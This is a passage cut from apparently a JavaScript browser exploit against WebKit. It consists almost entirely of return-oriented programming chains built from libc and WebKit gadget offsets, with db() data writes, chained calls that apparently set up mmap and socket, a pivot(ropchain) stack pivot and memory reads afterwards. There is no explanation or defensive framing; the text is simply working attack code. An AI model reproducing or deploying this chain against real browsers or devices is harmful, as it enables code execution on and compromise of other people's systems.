libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
mmap_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+217272,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
socket_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+218600,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([216, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967072, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+793877
]);
db([4294967216, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+547950,
libc_base+877175,
libc_base+793877
]);
db([1, 0]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+219976,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

db([5, 0, 0, 0, 0, 0]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
}